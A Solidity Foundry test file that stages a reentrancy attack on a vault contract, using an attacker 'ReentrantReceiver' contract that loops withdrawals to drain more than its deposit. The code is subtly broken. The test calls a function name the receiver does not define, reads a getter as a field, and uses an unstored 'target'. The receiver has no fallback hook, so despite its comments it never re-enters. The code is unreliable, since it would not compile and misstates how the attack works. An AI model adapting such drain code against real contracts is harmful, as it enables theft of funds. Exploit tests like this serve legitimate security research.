// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/ReentrancyVault.sol";

contract ReentrancyVaultTest is BaseTestWithBalanceLog {
    ReentrancyVault target;
    
    function setUp() public {
        super.setUp();
        target = new ReentrancyVault(); // Correctly deploy the contract once
        emit log_address(address(target), "Target address");
    }

    // Execute a reentrancy attack
    function testExploit() public balanceLog {
        (bool success, ) = payable(address(target)).call{value: 1 ether}("");
        require(success, "Failed to deposit");

        address attacker = createAccountWithBalance(2 ether);
        vm.startPrank(attacker);

        // Deploy a re-entering receiver
        ReentrantReceiver r = new ReentrantReceiver(payable(address(target)), target);

        r.initiateReentrancy();

        assertGt(r.withdrew, 1.99 ether); // Assert more than the original deposit was withdrawn
    }
}

// Re-entering receiver contract
contract ReentrantReceiver {
    uint public withdrew;
    address payable private _targetVault;

    constructor(address payable _vault, ReentrancyVault target) {
        _targetVault = _vault;
    }

    function initiateReentrantAttack() external payable {
        require(msg.value > 0, "No value sent");
        while (target.balances(address(this)) >= msg.value) {
            target.withdraw(msg.value); // Re-enter into the vault
        }
    }

    function withdraw(uint _amount) public {
        require(address(this).balance >= _amount, "Insufficient balance");
        withdrew += _amount;
        payable(msg.sender).transfer(_amount);
    }
}